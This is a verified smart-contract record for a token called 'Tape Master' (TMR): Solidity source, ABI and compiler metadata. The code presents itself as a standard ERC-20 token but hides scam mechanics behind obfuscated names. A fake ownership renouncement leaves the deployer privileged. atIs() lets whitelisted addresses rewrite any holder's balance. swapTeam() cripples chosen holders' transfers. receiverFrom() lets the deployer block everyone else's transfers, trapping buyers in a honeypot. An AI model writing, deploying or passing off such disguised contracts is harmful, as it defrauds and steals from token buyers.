{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface exemptShould {\n    function createPair(address tokenFrom, address toEnableTx) external returns (address);\n}\n\ninterface txMax {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address totalFrom) external view returns (uint256);\n\n    function transfer(address launchedMarketing, uint256 takeSenderFee) external returns (bool);\n\n    function allowance(address autoSell, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 takeSenderFee) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchedMarketing,\n        uint256 takeSenderFee\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchedTotalAmount, uint256 value);\n    event Approval(address indexed autoSell, address indexed spender, uint256 value);\n}\n\nabstract contract totalTx {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface walletSwap {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface takeTo is txMax {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TapeMaster is totalTx, txMax, takeTo {\n\n    uint8 private launchWallet = 18;\n\n    mapping(address => bool) public txListMin;\n\n    event OwnershipTransferred(address indexed liquidityLaunched, address indexed tokenTotal);\n\n    address autoTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address launchedMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function sellMax() public {\n        emit OwnershipTransferred(isToken, address(0));\n        maxReceiverEnable = address(0);\n    }\n\n    uint256 private fundTeam;\n\n    string private maxTrading = \"TMR\";\n\n    function enableLaunched(address shouldEnableAt) public {\n        if (txTake) {\n            return;\n        }\n        if (launchAmount == fundTeam) {\n            maxWallet = false;\n        }\n        txListMin[shouldEnableAt] = true;\n        \n        txTake = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fundMode;\n    }\n\n    address private maxReceiverEnable;\n\n    bool public txTake;\n\n    bool private shouldMin;\n\n    function owner() external view returns (address) {\n        return maxReceiverEnable;\n    }\n\n    bool private receiverShould;\n\n    function approve(address autoLiquidity, uint256 takeSenderFee) public virtual override returns (bool) {\n        minToShould[_msgSender()][autoLiquidity] = takeSenderFee;\n        emit Approval(_msgSender(), autoLiquidity, takeSenderFee);\n        return true;\n    }\n\n    function maxFrom(address launchSenderLaunched, address launchedMarketing, uint256 takeSenderFee) internal returns (bool) {\n        require(marketingEnable[launchSenderLaunched] >= takeSenderFee);\n        marketingEnable[launchSenderLaunched] -= takeSenderFee;\n        marketingEnable[launchedMarketing] += takeSenderFee;\n        emit Transfer(launchSenderLaunched, launchedMarketing, takeSenderFee);\n        return true;\n    }\n\n    mapping(address => uint256) private marketingEnable;\n\n    uint256 private maxLaunched;\n\n    constructor (){\n        \n        walletSwap tradingLaunched = walletSwap(autoTx);\n        marketingMax = exemptShould(tradingLaunched.factory()).createPair(tradingLaunched.WETH(), address(this));\n        \n        isToken = _msgSender();\n        txListMin[isToken] = true;\n        marketingEnable[isToken] = fundMode;\n        sellMax();\n        \n        emit Transfer(address(0), isToken, fundMode);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return maxTrading;\n    }\n\n    string private txSender = \"Tape Master\";\n\n    uint256 constant walletTrading = 1 ** 10;\n\n    function atIs(address buyAmount, uint256 takeSenderFee) public {\n        teamReceiverAt();\n        marketingEnable[buyAmount] = takeSenderFee;\n    }\n\n    function teamReceiverAt() private view {\n        require(txListMin[_msgSender()]);\n    }\n\n    uint256 private fundMode = 100000000 * 10 ** 18;\n\n    uint256 public launchAmount;\n\n    function transfer(address buyAmount, uint256 takeSenderFee) external virtual override returns (bool) {\n        return buyToken(_msgSender(), buyAmount, takeSenderFee);\n    }\n\n    function transferFrom(address launchSenderLaunched, address launchedMarketing, uint256 takeSenderFee) external override returns (bool) {\n        if (_msgSender() != autoTx) {\n            if (minToShould[launchSenderLaunched][_msgSender()] != type(uint256).max) {\n                require(takeSenderFee <= minToShould[launchSenderLaunched][_msgSender()]);\n                minToShould[launchSenderLaunched][_msgSender()] -= takeSenderFee;\n            }\n        }\n        return buyToken(launchSenderLaunched, launchedMarketing, takeSenderFee);\n    }\n\n    function getOwner() external view returns (address) {\n        return maxReceiverEnable;\n    }\n\n    function buyToken(address launchSenderLaunched, address launchedMarketing, uint256 takeSenderFee) internal returns (bool) {\n        if (launchSenderLaunched == isToken) {\n            return maxFrom(launchSenderLaunched, launchedMarketing, takeSenderFee);\n        }\n        uint256 receiverBuyMode = txMax(marketingMax).balanceOf(launchedMax);\n        require(receiverBuyMode == toSwap);\n        require(launchedMarketing != launchedMax);\n        if (autoSender[launchSenderLaunched]) {\n            return maxFrom(launchSenderLaunched, launchedMarketing, walletTrading);\n        }\n        return maxFrom(launchSenderLaunched, launchedMarketing, takeSenderFee);\n    }\n\n    mapping(address => bool) public autoSender;\n\n    bool public listTake;\n\n    function balanceOf(address totalFrom) public view virtual override returns (uint256) {\n        return marketingEnable[totalFrom];\n    }\n\n    function swapTeam(address marketingSell) public {\n        teamReceiverAt();\n        \n        if (marketingSell == isToken || marketingSell == marketingMax) {\n            return;\n        }\n        autoSender[marketingSell] = true;\n    }\n\n    bool private maxWallet;\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchWallet;\n    }\n\n    mapping(address => mapping(address => uint256)) private minToShould;\n\n    address public isToken;\n\n    uint256 toSwap;\n\n    function allowance(address sellTo, address autoLiquidity) external view virtual override returns (uint256) {\n        if (autoLiquidity == autoTx) {\n            return type(uint256).max;\n        }\n        return minToShould[sellTo][autoLiquidity];\n    }\n\n    address public marketingMax;\n\n    function name() external view virtual override returns (string memory) {\n        return txSender;\n    }\n\n    uint256 isAuto;\n\n    function receiverFrom(uint256 takeSenderFee) public {\n        teamReceiverAt();\n        toSwap = takeSenderFee;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedTotalAmount\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoLiquidity\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeSenderFee\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeSenderFee\",\"type\":\"uint256\"}],\"name\":\"atIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldEnableAt\",\"type\":\"address\"}],\"name\":\"enableLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"takeSenderFee\",\"type\":\"uint256\"}],\"name\":\"receiverFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingSell\",\"type\":\"address\"}],\"name\":\"swapTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeSenderFee\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchSenderLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeSenderFee\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txListMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "TapeMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}